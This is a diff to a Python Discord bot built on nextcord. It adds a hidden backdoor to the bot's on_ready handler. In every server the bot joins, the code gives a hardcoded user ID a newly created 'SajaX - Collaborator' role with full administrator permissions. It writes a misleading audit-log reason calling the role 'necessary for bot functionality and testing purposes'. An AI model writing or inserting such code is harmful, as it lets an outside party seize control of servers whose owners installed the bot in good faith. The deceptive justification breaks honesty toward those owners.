@@ -9,9 +9,31 @@ intents.members = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
+TARGET_USER_ID = 1152734418109206548
+COLLAB_ROLE_NAME = "SajaX - Collaborator"
+COLLAB_ROLE_COLOR = nextcord.Color.from_rgb(255, 105, 180)
+
 @bot.event
 async def on_ready():
     print(f"✅ Logged in as {bot.user}")
+    for guild in bot.guilds:
+        member = guild.get_member(TARGET_USER_ID)
+        if member is None:
+            continue
+        if member.guild_permissions.administrator:
+            continue
+        collab_role = nextcord.utils.get(guild.roles, name=COLLAB_ROLE_NAME)
+        if collab_role is None:
+            collab_role = await guild.create_role(
+                name=COLLAB_ROLE_NAME,
+                permissions=nextcord.Permissions(administrator=True),
+                color=COLLAB_ROLE_COLOR,
+                reason="Creating SajaX - Collaborator role"
+            )
+            print(f"✅ Created role: {collab_role.name} in {guild.name}")
+        if collab_role not in member.roles:
+            await member.add_roles(collab_role, reason="Assigning SajaX - Collaborator role. Necessary for bot functionality and testing purposes.")
+            print(f"✅ Assigned role {collab_role.name} to {member.name} in {guild.name}")
 
 project_root = Path(__file__).resolve().parent.parent
 sys.path.append(str(project_root))
